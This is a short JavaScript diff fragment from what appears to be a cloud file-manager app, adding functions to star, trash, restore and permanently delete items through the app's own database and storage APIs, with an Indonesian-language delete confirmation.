+window.toggleStarItem = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); } catch(e){alert(e.message);} };
+window.moveItemToTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles('root'); } catch(e){alert(e.message);} };
+window.restoreFromTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); } catch(e){alert(e.message);} };
+window.deleteItemPermanently = async () => { if(!confirm("Hapus permanen?")) return; try { if(selectedItem.type==='file') await storage.deleteFile(CONFIG.BUCKET_ID, selectedItem.fileId); await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id); loadFiles('trash'); calculateStorage(); } catch(e){alert(e.message);} };
